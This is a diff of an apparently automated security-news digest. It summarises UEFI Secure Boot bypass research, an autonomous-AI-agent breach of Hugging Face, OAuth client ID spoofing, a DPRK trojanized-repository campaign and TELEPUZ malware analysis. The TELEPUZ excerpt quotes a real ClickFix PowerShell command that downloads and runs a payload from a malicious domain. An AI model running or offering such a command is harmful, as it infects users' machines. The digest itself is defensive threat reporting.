-- Corroborating source count: 1
-- Strong signals: (none)
-
-#### Cluster taxonomy (union across members)
-- threat_categories: vulnerability_disclosure
-- affected_industries: critical_infrastructure
-- affected_products: Microsoft Windows
-- cve_ids: CVE-2026-10797, CVE-2026-8863
-- content_type: news_report
-- confidence_tier: tier_1_primary_research
-
-#### Primary article taxonomy
-- threat_categories: vulnerability_disclosure
-- affected_industries: critical_infrastructure
-- affected_products: Microsoft Windows
-- cve_ids: CVE-2026-8863, CVE-2026-10797
-- content_type: news_report
-- confidence_tier: tier_1_primary_research
-
-#### Summary
-
-```
-ESET researchers discovered 11 vulnerable UEFI shim bootloaders signed by Microsoft that allow attackers to bypass UEFI Secure Boot by exploiting decade-old vulnerabilities
-```
-
-#### Full body
-
-```
-ESET Research Forgotten UEFI shims undermining Secure Boot ESET researchers discovered 11 vulnerable UEFI shim bootloaders signed by Microsoft that allow attackers to bypass UEFI Secure Boot by exploiting decade-old vulnerabilities Martin Smolár 14 Jul 2026 • , 20 min. read ESET researchers identified 11 old and forgotten UEFI shim bootloaders at versions 0.9 and below that can be used to bypass UEFI Secure Boot on any UEFI-based machine that trusts Microsoft’s Microsoft Corporation UEFI CA 2011 third-party UEFI certificate authority (CA) certificate, regardless of the installed operating system (OS). Reported shims can be exploited to execute untrusted code during system boot, enabling attackers to deploy malicious UEFI bootkits (such as Bootkitty , HybridPetya , or BlackLotus ) even on systems with UEFI Secure Boot enabled. We reported our findings to CERT/CC in February 2026, and the vulnerable UEFI applications were revoked on Microsoft’s June 9 th , 2026 Patch Tuesday. While two CVE IDs were assigned to this case to cover the reported shims, CVE-2026-8863 and CVE-2026-10797 , exploitation of each reported shim is not just about a single bug or two that can be found in these old shims directly. In fact, the attack surface is extended by the shims’ trusted, second-stage bootloaders (mostly GRUB 2 ), which – like the shims themselves – may include outdated versions with known vulnerabilities. The discovered shims come from various tools or software packages, including PC-diagnostics software, Linux distributions, and other UEFI-based utilities. Importantly, exploitation is not limited to systems with the affected software or OS installed, as attackers can bring their own copy of the vulnerable shims to any UEFI system with the Microsoft third-party UEFI certificate enrolled. The full list of the software products relying on the reported shims along with their affected versions is available in CERT/CC’s Vulnerability Note . In response to ESET researchers’ report, UEFI shim bootloaders with the following PE Authenticode hashes were revoked in the dbx update that was part of Microsoft’s June 9 th Patch Tuesday : AE75F0D82BA3DF824FBFC69340CC3B4D66C598373B1AB54CDB6C8BFD83A6B961 7B2A3F5C96F95BD8086CE54B0825E300F9C8F11FE3401BB631B3215C8DE9EB10 EB86FA1386FE6E4533B8B938DCC1250616D2F1C14C15E2FCF80834A161018A0A FD23D6E57DE6F4E1F9D7118DA1C5F31A8AF6BE5E5D9E8170F9493447268D50C5 A0DE9333442C1BF9349A460141AE5E80F911955C6506040FA3D021BF6C1AE3E4 95B6D71FC0C0F8C5E1533A37AEF92CF6B0C961E2CC612A97117FA6759CE5FC06 236A9CB0D71951C36398A32EB660CE2CD4A52CCFA7CF751CC6A35D9DE549E19B 5E594C448760A3135B1A3A83E07A4F2E6FBE49414EF2C7CAB1CBA77F284FA63B 8A964D5F8373948D20A1D4296FB92E545DAD4617A0C810F3B934B53D98AE8963 410260B1B6F5AF5FBEEB9EA3220658435E876CB3247126EE907A437F312DB373 96275DFD6282A522B011177EE049296952AC794832091F937FBBF92869028629 Key points of this blogpost: ESET researchers discovered 11 old, Microsoft-signed, UEFI applications that allow bypassing UEFI Secure Boot on the majority of UEFI-based systems. An attacker exploiting one of these vulnerable applications can execute untrusted code during system boot, enabling deployment of malicious UEFI bootkits or other malware. Exploitation is not limited to systems with the affected software or OS installed, as attackers can bring their own copy of the vulnerable binaries to any UEFI system with the Microsoft third-party UEFI certificate enrolled. All UEFI systems with Microsoft third-party UEFI signing enabled are affected (Windows 11 Secured-core PCs should have this option disabled by default). The vulnerable binaries were revoked by Microsoft in the June 9 th , 2026 Patch Tuesday update. Following is the coordinated disclosure timeline. We’d like to thank CERT/CC for its help in coordinating the vulnerability disclosure process, and the affected vendors for smooth and transparent communication and cooperation during the vulnerability disclosure and remediation process. To protect your systems
-```
-
-#### Corroborating sources (1)
-
-- **ESET WeLiveSecurity** (threat_research_primary)
-  - Title: Forgotten UEFI shims undermining Secure Boot
-  - Published: 2026-07-14T08:53:00+00:00
-  - Link: https://www.welivesecurity.com/en/eset-research/forgotten-uefi-shims-undermining-secure-boot/
-  - Summary: ESET researchers discovered 11 vulnerable UEFI shim bootloaders signed by Microsoft that allow attackers to bypass UEFI Secure Boot by exploiting decade-old vulnerabilities
-
 ### Cluster 35f060c850 — score 10
 
 - Title: Sunsetting the Public AttackerKB Platform
@@ -3054,6 +2961,49 @@ Estée Lauder discloses data breach via Oracle E-Business flaw By Bill Toulas Ju
   - Published: 2026-07-20T22:39:30+00:00
   - Link: https://www.bleepingcomputer.com/news/security/est-e-lauder-discloses-data-breach-via-oracle-e-business-flaw/
   - Summary: Cosmetics giant Estée Lauder is notifying customers of a data breach after hackers exploited a flaw in Oracle E-Business Suite that the company used for human resources (HR) operations. [...]
+
+### Cluster 2de7ac9412 — score 10
+
+- Title: World's Largest AI Model Repository Hugging Face Breached by Autonomous AI Agent
+- Source: The Hacker News (cyber_news_breach_reporting)
+- Published: 2026-07-20T05:27:26+00:00
+- Link: https://thehackernews.com/2026/07/worlds-largest-ai-model-repository.html
+- Fetch status: ok
+- Member count: 1
+- Corroborating source count: 1
+- Strong signals: (none)
+
+#### Cluster taxonomy (union across members)
+- threat_categories: credential_theft, data_breach, phishing_social_eng, supply_chain
+- affected_products: Microsoft 365
+- content_type: threat_research
+- confidence_tier: tier_4_news
+
+#### Primary article taxonomy
+- threat_categories: supply_chain, phishing_social_eng, credential_theft, data_breach
+- affected_products: Microsoft 365
+- content_type: threat_research
+- confidence_tier: tier_4_news
+
+#### Summary
+
+```
+In an ironic twist, open-source artificial intelligence (AI) platform Hugging Face revealed that it was the victim of a hack perpetrated by an autonomous AI agent system. The company said it detected and responded to the incident targeting its production infrastructure earlier last week. "We identified unauthorized access to a limited set of internal datasets and to several credentials used by
+```
+
+#### Full body
+
+```
+World's Largest AI Model Repository Hugging Face Breached by Autonomous AI Agent  Ravie Lakshmanan  Jul 20, 2026 AI Security / Vulnerability In an ironic twist, open-source artificial intelligence (AI) platform Hugging Face revealed that it was the victim of a hack perpetrated by an autonomous AI agent system. The company said it detected and responded to the incident targeting its production infrastructure earlier last week. "We identified unauthorized access to a limited set of internal datasets and to several credentials used by our services," the company said in a statement. While an investigation into the intrusion remains ongoing, Hugging Face said it has found no evidence that the AI agent tampered with public, user-facing models, datasets, or Spaces, and its own software supply chain. The starting point of the attack was the data processing pipeline itself, with a malicious dataset abusing two code execution paths, viz., in its remote code dataset loader and a template injection in a dataset configuration, to run code on a processing worker. With that access, the threat actor is said to have escalated to node-level access, collected cloud and cluster credentials, and moved laterally into several internal clusters over a weekend. The exact large language model (LLM) used to pull off the attack is unclear, but the campaign was executed by an autonomous agent framework performing "many thousands of individual actions across a swarm of short-lived sandboxes, with self-migrating command-and-control staged on public services." Hugging Face said it has since addressed the root cause of the issue, precisely the code execution pathways used for initial access. It also carried out the following remediation steps - Removed the attacker's foothold across the affected clusters and rebuilt the compromised nodes Revoked and rotated the affected credentials and tokens, and a broader rotation of secrets was undertaken as a precautionary measure. Deployed additional guardrails and stricter admission controls on its clusters Improved detection and alerting to ensure responders are notified within minutes, 24x7 As a further safeguard, Hugging Face is urging customers to rotate any access tokens and review recent activity on their accounts. The company also said it turned to Z.ai's GLM 5.2 , a Chinese open-weight model, to conduct the forensic analysis after Western frontier models refused requests containing real attack commands, exploit payloads, and command-and-control (C2) artifacts because their safety guardrails were triggered and owing to their inability to differentiate between an attacker and a legitimate incident response effort. "This experience points to a gap worth planning for," the New York-headquartered company said. "We do not know which model powered the attacker's agents, whether a jailbroken hosted model or an unrestricted open-weight one; either way, the attacker was bound by no usage policy, while our own forensic work was blocked by the guardrails of the hosted models we first tried." "The practical lesson for defenders: have a capable model you can run on your own infrastructure vetted and ready before an incident, both to avoid guardrail lockout and to keep attacker data and credentials from leaving your environment." Found this article interesting? Follow us on Google News , Twitter and LinkedIn to read more exclusive content we post. SHARE      Tweet  Share  Share  Share SHARE  AI Security , Cloud security , Code Execution , Credential Theft , Cyber Attack , data breach , Incident response , Infrastructure Security , Open Source , Vulnerability ⚡ Top Stories This Week URGENT - Progress Tells ShareFile Customers to Shut Down Storage Zone Controllers Over Security Threat Misconfigured Server Reveals Three Evilginx Phishing Operations Targeting Microsoft 365 Meta Files Patent for AI That Can Listen All Day and Track How You're Feeling New MemGhost Attack Plants Persistent False Memories in AI Agents Throu
+```
+
+#### Corroborating sources (1)
+
+- **The Hacker News** (cyber_news_breach_reporting)
+  - Title: World's Largest AI Model Repository Hugging Face Breached by Autonomous AI Agent
+  - Published: 2026-07-20T05:27:26+00:00
+  - Link: https://thehackernews.com/2026/07/worlds-largest-ai-model-repository.html
+  - Summary: In an ironic twist, open-source artificial intelligence (AI) platform Hugging Face revealed that it was the victim of a hack perpetrated by an autonomous AI agent system. The company said it detected and responded to the incident targeting its production infrastructure earlier last week. "We identified unauthorized access to a limited set of internal datasets and to several credentials used by
 
 ### Cluster c617455b3a — score 10
 
@@ -3379,92 +3329,6 @@ Professional services giant Ernst & Young (EY) has started notifying its clients
   - Link: https://www.securityweek.com/ernst-young-data-breach-affects-personal-financial-information/
   - Summary: Hackers stole names, addresses, Social Security numbers, credit/debit card numbers, and other information from a third-party management platform. The post Ernst & Young Data Breach Affects Personal, Financial Information appeared first on SecurityWeek .
 
-### Cluster 8a5c2010c7 — score 9
-
-- Title: Italy fines WINDTRE €1.7 million over security flaws behind two data breaches
-- Source: Help Net Security (cyber_news_breach_reporting)
-- Published: 2026-07-20T13:19:05+00:00
-- Link: https://www.helpnetsecurity.com/2026/07/20/italy-windtre-1-7-million-fine/
-- Fetch status: ok
-- Member count: 1
-- Corroborating source count: 1
-- Strong signals: (none)
-
-#### Cluster taxonomy (union across members)
-- threat_categories: data_breach, phishing_social_eng
-- affected_industries: telecommunications
-- content_type: incident_report
-- confidence_tier: tier_4_news
-
-#### Primary article taxonomy
-- threat_categories: phishing_social_eng, data_breach
-- affected_industries: telecommunications
-- content_type: incident_report
-- confidence_tier: tier_4_news
-
-#### Summary
-
-```
-Italy’s data protection authority, the Garante per la Protezione dei Dati Personali, fined WINDTRE €1.7 million over “serious data security shortcomings” that let hackers breach its systems twice and exfiltrate personal data belonging to more than 365,000 customers. The regulator opened its investigation after WINDTRE, one of Italy’s major telecom operators, reported two separate data breaches in February 2025. The attackers relied on old-school social engineering instead of exploiting software vulnerabilities. Posing as support technicians, … More → The post Italy fines WINDTRE €1.7 million over security flaws behind two data breaches appeared first on Help Net Security .
-```
-
-#### Full body
-
-```
-Sinisa Markovic , Managing Editor, Help Net Security July 20, 2026 Share Italy fines WINDTRE €1.7 million over security flaws behind two data breaches Italy’s data protection authority, the Garante per la Protezione dei Dati Personali, fined WINDTRE €1.7 million over “serious data security shortcomings” that let hackers breach its systems twice and exfiltrate personal data belonging to more than 365,000 customers. The regulator opened its investigation after WINDTRE, one of Italy’s major telecom operators, reported two separate data breaches in February 2025. The attackers relied on old-school social engineering instead of exploiting software vulnerabilities. Posing as support technicians, they convinced staff at two WINDTRE stores to grant them access to company systems. That access let them pull customer names and contact details out of the company’s systems. Payment data exposed for thousands For 41,359 of the affected customers, the stolen data went beyond names and contact information. It included payment details: postal payment slips, IBAN numbers, partially masked credit card numbers, and card expiry dates. The regulator found deficiencies in how the company managed login credentials and digital certificates. Its investigation also found that WINDTRE’s own security audits had missed vulnerabilities that more thorough checks would have caught. According to the authority, these vulnerabilities allowed hackers to access the company’s systems and steal personal data. The technical flaws the regulator couldn’t ignore WindTre argued it already had solid security in place: three-factor authentication, CAPTCHA, firewalls, night-time access blocks, and weekly monitoring of store lookups. The company said the incidents came down to human error , unrelated to system vulnerabilities. It also said it couldn’t force independently run stores or non-employee staff to use a password manager. The regulator rejected that defense and pointed to two technical failures. The first was certificate handling. WindTre’s digital certificates and private keys weren’t stored in encrypted vaults or dedicated key-management systems, leaving them exposed if a device were compromised. The second was API protection . The secondary, internal APIs that let the enumeration attack run at scale, roughly 2 million requests, weren’t covered by the company’s own vulnerability testing; only the main APIs were. The regulator said rate-limiting and CAPTCHA on those endpoints, standard under the OWASP API Security Top 10 framework, would likely have caught it. The regulator ruled that WINDTRE broke GDPR rules on data integrity, confidentiality, and security. As part of its decision, the authority ordered the company to: Strengthen how it protects login credentials and digital certificates Introduce secure tools for password management Improve its cybersecurity procedures to prevent similar incidents In setting the penalty amount, the regulator weighed four things: how quickly WINDTRE reported the breaches, the steps the company took to fix problems after the attack, its cooperation during the investigation, and the fact that WINDTRE had no prior privacy violations on record. More about breach data breach EU GDPR Share
-```
-
-#### Corroborating sources (1)
-
-- **Help Net Security** (cyber_news_breach_reporting)
-  - Title: Italy fines WINDTRE €1.7 million over security flaws behind two data breaches
-  - Published: 2026-07-20T13:19:05+00:00
-  - Link: https://www.helpnetsecurity.com/2026/07/20/italy-windtre-1-7-million-fine/
-  - Summary: Italy’s data protection authority, the Garante per la Protezione dei Dati Personali, fined WINDTRE €1.7 million over “serious data security shortcomings” that let hackers breach its systems twice and exfiltrate personal data belonging to more than 365,000 customers. The regulator opened its investigation after WINDTRE, one of Italy’s major telecom operators, reported two separate data breaches in February 2025. The attackers relied on old-school social engineering instead of exploiting software vulnerabilities. Posing as support technicians, … More → The post Italy fines WINDTRE €1.7 million over security flaws behind two data breaches appeared first on Help Net Security .
-
-### Cluster cf04a9eefa — score 9
-
-- Title: Meet Dusseldorf, Microsoft’s open-source out-of-band security platform
-- Source: Help Net Security (cyber_news_breach_reporting)
-- Published: 2026-07-20T06:00:36+00:00
-- Link: https://www.helpnetsecurity.com/2026/07/20/microsoft-dusseldorf-out-of-band-application-security-testing-oast-platform/
-- Fetch status: ok
-- Member count: 1
-- Corroborating source count: 1
-- Strong signals: (none)
-
-#### Cluster taxonomy (union across members)
-- affected_industries: critical_infrastructure
-- affected_products: GitHub
-- content_type: news_report
-- confidence_tier: tier_4_news
-
-#### Primary article taxonomy
-- affected_industries: critical_infrastructure
-- affected_products: GitHub
-- content_type: news_report
-- confidence_tier: tier_4_news
-
-#### Summary
-
-```
-Out-of-band vulnerabilities surface when an application quietly reaches out to an external system during an attack, and capturing that traffic calls for infrastructure that many researchers assemble on their own. A new open-source project from Microsoft supplies that infrastructure in a package meant to run inside a private environment. Dusseldorf is an out-of-band application security testing platform. It captures inbound network traffic across several protocols and lets an operator craft automated responses for validation workflows. … More → The post Meet Dusseldorf, Microsoft’s open-source out-of-band security platform appeared first on Help Net Security .
-```
-
-#### Full body
-
-```
-Anamarija Pogorelec , Senior Staff Writer, Help Net Security July 20, 2026 Share Meet Dusseldorf, Microsoft’s open-source out-of-band security platform Out-of-band vulnerabilities surface when an application quietly reaches out to an external system during an attack, and capturing that traffic calls for infrastructure that many researchers assemble on their own. A new open-source project from Microsoft supplies that infrastructure in a package meant to run inside a private environment. Dusseldorf is an out-of-band application security testing platform. It captures inbound network traffic across several protocols and lets an operator craft automated responses for validation workflows. The name comes from a Microsoft habit of using place names for projects. The German city Düsseldorf carries the letters SSRF, and the umlaut gives way to a plain u for everyday use. The tool targets a set of defects that leave few traces inside an application. These include server-side request forgery, cross-site scripting, server-side template injection, XML external entity flaws, and related classes. Detection depends on watching what an application does at the network edge, which is where Dusseldorf sits. Once deployed, the platform runs DNS, HTTP, and HTTPS listeners tied to a domain such as *.yourdomain.net. Every request to that domain and any subdomain lands in the capture log. The project calls these subdomains zones, so foo.yourdomain.net and foo.bar.yourdomain.net both register as distinct entries. A protected graphical interface and a matching REST API give an operator a view of captured requests and their responses, along with controls for custom responses and filters. Private deployment is the design premise. An operator controls identity integration, the infrastructure footprint, the domains in play, and the runtime policies that govern request handling. Rules and service-level changes adjust how the platform answers incoming traffic. Running Dusseldorf calls for a machine on the internet with one or more public IPv4 addresses and a domain whose name server record points at those addresses. The codebase is built for Azure and splits into two deployment paths. A local path covers lab setups and developer iteration, with credential generation, certificate setup, and Docker Compose workflows. An Azure path handles cloud provisioning and database initialization through Helm. The prerequisite list reflects that dual approach. An installer needs Docker, Docker Compose, the Azure CLI, OpenSSL for TLS certificates, Python 3 with pip, the jq utility, and Helm. After deployment, operators work through the interface and API, with a command-line path documented alongside them. Dusseldorf is available for free on GitHub . Must read: 20 open-source cybersecurity tools to keep your team ready for anything GitHub CISO on security strategy and collaborating with the open-source community Subscribe to the Help Net Security ad-free monthly newsletter to stay informed on the essential open-source cybersecurity tools. Subscribe here! More about GitHub Microsoft network open source software traffic monitoring Share
-```
-
-#### Corroborating sources (1)
-
-- **Help Net Security** (cyber_news_breach_reporting)
-  - Title: Meet Dusseldorf, Microsoft’s open-source out-of-band security platform
-  - Published: 2026-07-20T06:00:36+00:00
-  - Link: https://www.helpnetsecurity.com/2026/07/20/microsoft-dusseldorf-out-of-band-application-security-testing-oast-platform/
-  - Summary: Out-of-band vulnerabilities surface when an application quietly reaches out to an external system during an attack, and capturing that traffic calls for infrastructure that many researchers assemble on their own. A new open-source project from Microsoft supplies that infrastructure in a package meant to run inside a private environment. Dusseldorf is an out-of-band application security testing platform. It captures inbound network traffic across several protocols and lets an operator craft automated responses for validation workflows. … More → The post Meet Dusseldorf, Microsoft’s open-source out-of-band security platform appeared first on Help Net Security .
-
 ### Cluster b47b034408 — score 9
 
 - Title: Vulnerability in FIFA’s Network
@@ -3601,48 +3465,13 @@ Data Analytics Level Up Your Column-level Security: Using IAM Data Governance Ta
   - Link: https://www.darkreading.com/cloud-security/google-bets-agentic-defense-strategy-outpace-attackers
   - Summary: Google Cloud incorporates key Wiz capabilities into an agentic defense platform to automate threat detection and remediation against AI attacks.
 
-### Cluster d77ec8e022 — score 8
-
-- Title: Pandora’s Container Part 1: Unpacking Azure Container Security
-- Source: TrustedSec (detection_response_operations)
-- Published: 2026-07-14T04:00:00+00:00
-- Link: https://trustedsec.com/blog/pandoras-container-part-1-unpacking-azure-container-security
-- Fetch status: not_attempted
-- Member count: 1
-- Corroborating source count: 1
-- Strong signals: Azure
-
-#### Cluster taxonomy (union across members)
-- affected_products: Azure
-- content_type: news_report
-- confidence_tier: tier_2_operator
-
-#### Primary article taxonomy
-- affected_products: Azure
-- content_type: news_report
-- confidence_tier: tier_2_operator
-
-#### Summary
-
-```
-<p>Azure container services are everywhere. Their attack surface? Often overlooked. In Part 1 of this blog series, we walk through offensive techniques targeting registries, token keys, and container instances in Azure.</p>
-```
-
-#### Corroborating sources (1)
-
-- **TrustedSec** (detection_response_operations)
-  - Title: Pandora’s Container Part 1: Unpacking Azure Container Security
-  - Published: 2026-07-14T04:00:00+00:00
-  - Link: https://trustedsec.com/blog/pandoras-container-part-1-unpacking-azure-container-security
-  - Summary: <p>Azure container services are everywhere. Their attack surface? Often overlooked. In Part 1 of this blog series, we walk through offensive techniques targeting registries, token keys, and container instances in Azure.</p>
-
 ### Cluster e06d2a4227 — score 8
 
 - Title: OAuth Client ID Spoofing Lets Attackers Validate Stolen Microsoft Entra Credentials
 - Source: Proofpoint Threat Insight (detection_response_operations)
 - Published: 2026-07-14T13:36:51+00:00
 - Link: https://www.proofpoint.com/us/newsroom/news/oauth-client-id-spoofing-lets-attackers-validate-stolen-microsoft-entra-credentials
-- Fetch status: not_attempted
+- Fetch status: ok
 - Member count: 1
 - Corroborating source count: 1
 - Strong signals: Microsoft Entra
@@ -3657,6 +3486,12 @@ Data Analytics Level Up Your Column-level Security: Using IAM Data Governance Ta
 - content_type: news_report
 - confidence_tier: tier_2_operator
 
+#### Full body
+
+```
+OAuth Client ID Spoofing Lets Attackers Validate Stolen Microsoft Entra Credentials  Ravie Lakshmanan  Jul 14, 2026 Cloud Security / Identity Security At least two distinct threat actors are weaponizing a novel evasion technique called OAuth client ID spoofing in cloud campaigns, while slipping past telemetry. The activity allows users to enumerate user accounts and validate stolen credentials in Microsoft Entra ID environments, without ever generating a successful sign-in event that would otherwise alert defenders. And bad actors have begun to exploit this gap to obtain unauthorized access to an organization's cloud services. "A blind spot in cloud sign-in telemetry: Entra ID returns different error responses depending on whether a supplied OAuth client ID is valid," Proofpoint said in a statement. "Attackers exploit this to infer valid usernames and correct passwords at scale, effectively checking stolen credential lists without logging a successful login." In other words, the attacks leverage the OAuth client ID, a globally unique identifier (GUID) assigned to applications when requesting access to user data, and is passed as " client_id " in authentication requests. By providing spoofed client IDs, it enables account enumeration without a registered OAuth application and permits attackers to infer both password and account validity without generating a successful sign-in event. "The Entra sign‑in logs are a primary telemetry source for identifying malicious authentication activity, including user enumeration, password spraying, and initial access attempts," Proofpoint researcher Rachel Rabin said . Threat clusters like UNK_CustomCloak have been observed spoofing User-Agent strings to orchestrate brute-force campaigns targeting Microsoft Entra ID environments by exploiting a legacy, discontinued first-party application called Windows Live Custom Domains to bypass standard sign-in restrictions and probe user passwords across over 4,000 tenants. But the latest efforts mark an evolution of this tradecraft by spoofing the OAuth client IDs via HTTP POST requests to Microsoft's OAuth 2.0 token endpoint using the Resource Owner Password Credentials ( ROPC ) flow. Specifically, this involves supplying a syntactically valid client ID but one that does not correspond to a real application. In such scenarios, only the application ID is recorded in the Entra sign-in log without a corresponding application name. The response, which contains an Azure Active Directory Security Token Service ( AADSTS ) error code, can then be used to infer whether the account exists and whether the password is correct without a registered application. "If the spoofed client ID is not a proper UUIDv4, Entra does not reject the request outright," Proofpoint explained. "Attackers can therefore analyze this error response to identify valid accounts and passwords, despite using malformed client IDs." "When a spoofed client ID is used, no corresponding application name is recorded in the sign-in log. This means that detections that look for surges against a specific application name may miss this activity entirely, as the field is blank." Armed with this information, attackers could identify accounts that could be exploited for stealthy access, at the same time making it challenging for defenders to identify suspicious activity. Proofpoint said it has identified two large campaigns that have independently adopted the technique towards the end of December 2025, indicating the approach is being increasingly incorporated into attacker tradecraft as opposed to being an isolated incident: UNK_pyreq2323 (from January to March 2026), which used more than 700,000 spoofed client IDs from Amazon Web Services (AWS) infrastructure to target more than 1 million accounts across nearly 4,000 tenants, causing lockouts for roughly 28% of targeted users due to failed attempts. UNK_OutFlareAZ (starting Dec 2025), which leveraged Cloudflare infrastructure to target over 2 million
+```
+
 #### Corroborating sources (1)
 
 - **Proofpoint Threat Insight** (detection_response_operations)
@@ -3670,18 +3505,20 @@ Data Analytics Level Up Your Column-level Security: Using IAM Data Governance Ta
 - Source: Elastic Security Labs (detection_response_operations)
 - Published: 2026-07-18T00:00:00+00:00
 - Link: https://www.elastic.co/security-labs/contagious-interview-malware-svg-steganography
-- Fetch status: not_attempted
+- Fetch status: ok
 - Member count: 1
 - Corroborating source count: 1
 - Strong signals: (none)
 
 #### Cluster taxonomy (union across members)
-- threat_categories: web_shell_backdoor
+- threat_categories: supply_chain, web_shell_backdoor
+- affected_industries: financial_services, retail_ecommerce
 - content_type: news_report
 - confidence_tier: tier_2_operator
 
 #### Primary article taxonomy
-- threat_categories: web_shell_backdoor
+- threat_categories: supply_chain, web_shell_backdoor
+- affected_industries: financial_services, retail_ecommerce
 - content_type: news_report
 - confidence_tier: tier_2_operator
 
@@ -3689,6 +3526,12 @@ Data Analytics Level Up Your Column-level Security: Using IAM Data Governance Ta
 
 ```
 DPRK-aligned hackers hid malware inside SVG flag images to backdoor developer job interview coding tests. Not one antivirus vendor caught it.
+```
+
+#### Full body
+
+```
+18 July 2026 • Daniel Stepanic New North Korean campaign uses fake coding interviews to steal developer credentials DPRK-aligned hackers hid malware inside SVG flag images to backdoor developer job interview coding tests. Not one antivirus vendor caught it. 9 min read Threat Intelligence , Malware Analysis Elastic Security Labs found a new Contagious Interview campaign, tracked as REF9403, hiding malware inside SVG image files using steganography. To our knowledge, this specific infection chain has not been previously documented. We found it after the DPRK-aligned group targeted our own community Slack workspace with a fake job posting and a "coding challenge" project. Any user who ran the project ended up with a four-stage payload aligned with OTTERCOOKIE: a browser credential and crypto wallet stealer, a file stealer, a Socket.IO-based remote access trojan (RAT), and a clipboard stealer. This campaign reinforces that developers remain a prime target, where the compromise of a single individual can provide the initial access needed to enable far-reaching supply chain attacks against downstream organizations. Key takeaways Elastic Security Labs discovers new activity aligned with Contagious Interview targeting developers Campaigns involve coding challenges and take-home assignments with benign-looking projects containing malicious backdoored code Projects hide payloads with steganography in SVG image files The distributed malware shares technical and behavioral similarities with OTTERCOOKIE How Elastic discovered this malware campaign This investigation started differently from most of our previous research. Instead of using telemetry to surface interesting threats, we were alerted to suspicious activity targeting members of our community Slack workspace with socially engineered, ad hoc job offers. For background, we use the community Slack platform to engage with and solve problems for our users, focusing on providing product support and syncing on new updates. We’ve reported on this technique several times : threat actors targeting developers in open forums with lures of coding side-work. The lucrative offers lead to the requirement to load specific libraries, tools, scripts, etc., into the code the developer is crafting. These components are created by the threat actors and once they’re executed by the developers, they are able to load additional malware and gain remote access to the developer host. From there, the threat actors can steal credentials, keys, wallets, or use the access to gain access to additional systems. We did not find evidence that the lures were targeted at Elastic users specifically, but any open forum where developers congregate is a potential watering hole. On May 26, 2026, a user named Maxwell posted in our #jobs channel, stating that they were upgrading an e-commerce platform and were looking for an experienced developer to help with the project. They strategically moved their interactions with interested users into direct messages (DM). In these direct messages, Maxwell requested that users perform a test challenge as part of the job offer. These recipients were given a trojanized repository that, when executed, contained malware that exfiltrated sensitive files and credentials and configured a Socket.IO backdoor. Building on this initial case, we found multiple campaigns exhibiting the same underlying behavior. These trojanized repositories at the time of writing have zero detections and are not flagged by any AV vendors: next-ecommerce-private-main.zip shopping-platform-main.zip ecommerce-platform.zip ecommerce-platform-main.zip shopping-platform.rar shop-main.zip ecommerce-main.zip These fake challenges operate similarly, containing fully functional code. Our first sample was a Next.js e-commerce template that was copied from GreatStackDev called GoCart . The threat actors tampered with this repository by inserting small snippets of malicious code at various points and using benign variable name
 ```
 
 #### Corroborating sources (1)
@@ -3705,16 +3548,18 @@ DPRK-aligned hackers hid malware inside SVG flag images to backdoor developer jo
 - Source: Elastic Security Labs (detection_response_operations)
 - Published: 2026-07-16T00:00:00+00:00
 - Link: https://www.elastic.co/security-labs/telepuz-maas-malware-clickfix
-- Fetch status: not_attempted
+- Fetch status: ok
 - Member count: 1
 - Corroborating source count: 1
 - Strong signals: (none)
 
 #### Cluster taxonomy (union across members)
+- threat_categories: phishing_social_eng
 - content_type: news_report
 - confidence_tier: tier_2_operator
 
 #### Primary article taxonomy
+- threat_categories: phishing_social_eng
 - content_type: news_report
 - confidence_tier: tier_2_operator
 
@@ -3722,6 +3567,12 @@ DPRK-aligned hackers hid malware inside SVG flag images to backdoor developer jo
 
 ```
 TELEPUZ is a modular malware that emerged through CLICKFIX-VIDAR attacks in April. We reverse-engineered it to show you the infrastructure and evasion techniques that matter.
+```
+
+#### Full body
+
+```
+16 July 2026 • Cyril François TELEPUZ: a modular MaaS malware spreading via CLICKFIX-VIDAR chains TELEPUZ is a modular malware that emerged through CLICKFIX-VIDAR attacks in April. We reverse-engineered it to show you the infrastructure and evasion techniques that matter. 13 min read Malware Analysis Elastic Security Labs is tracking an emerging threat named TELEPUZ, which we have discovered spreading widely via a CLICKFIX-VIDAR chain. This malware is in active development and has been operating since late April 2026, according to the infrastructure information we collected. The malware is full-featured, lightweight, and modular. While the number of C2 domains is currently small, the daily volume of builds uploaded to VirusTotal and the rapid pace of updates indicate active development and likely further growth. Key takeaways Full-featured malware, modular, fast evolving Possible new MaaS, spreading fast Currently low number of C2 domains Stagers, main payload, and additional modules; uses WebSockets for communication. Observed delivered via a CLICKFIX-VIDAR campaign. TELEPUZ infection chain via CLICKFIX-VIDAR The infection chain begins with a ClickFix social engineering infection, in which the user visits a malicious web page and is prompted to copy and paste, then execute, a Windows shell command to access the page's content. C:\WINDOWS\system32\WindowsPowerShell\v1.0\PowerShell.exe" -NoP -w h -ep bypass -c \ "$h='memsho'+'wblob[.]forum';$n='f322a5fa.exe';$u='https://'+$h+'/api/index.php?a=grab';\ $f=$env:TEMP+'\'+$n;[Net.WebClient]::new().('Down'+'loadFile')($u,$f);\ ri($f+':Zone.Identifier')-EA 0;& $f The command downloads the second stage from the URL hxxps://memshowblob[.]forum/api/index.php?a=grab and executes the binary in the user's %TEMP% folder. The second stage is a VIDAR Go variant ( 580b441e2961739fd26e54e0a0ea08351cb10a51839519fc722cfa39ecd0c954 ). VIDAR is a well-documented threat known for its ability to download and deploy secondary payloads. In this campaign, we observed it downloading and executing two additional components: the TELEPUZ stager ( install.exe ) and the main binary ( telepuz.dll ), both of which were retrieved from the hurgadatour[.]shop domain. The telemetriawork part in the second-stage domain URL is a significant marker for this family; searching for this name on VirusTotal yields a large number of stagers and payloads associated with this family. The third stage ( 03fa348b70819296c958c842e7646b3b7efe5fa217ed5098143003c47995a746 ) is a small PE, roughly 13–15 KB in size, designed to download and execute the main payload. After downloading the DLL, the stager installs it in the configured install folder and execute it using rundll32 with the specified export name. These stagers share the same obfuscation mechanism as the main payload, which we will analyze in the following chapter, effectively linking them to the same family. TELEPUZ technical analysis and internals The reference sample is 58aec6e3835aaf20f7b4a7e308b36a19e7454673a6f71783871e9bcf6cae8eed The main payload is a 64-bit Windows shared library with one or two exports, whose names are systematically chosen to disguise the library as legitimate software. The malware is written in C, likely by hand, lightweight, modular, and the code quality is correct. The malware contains sparse memory allocations, little middleware, and some features still under development. These elements indicate that the project is led either by a solo developer or a very small team, and that coding is their core business. Given the significant number of builds uploaded to VirusTotal daily, it is likely that we are dealing with a MaaS. Our sample contains the following exports: TELEPUZ obfuscation techniques Garbage instructions The malware interleaves its actual code with “garbage instructions,” which have no functional purpose and are intended to slow down reverse engineering. However, some of these instructions are built to produce side effects, such as upda
 ```
 
 #### Corroborating sources (1)
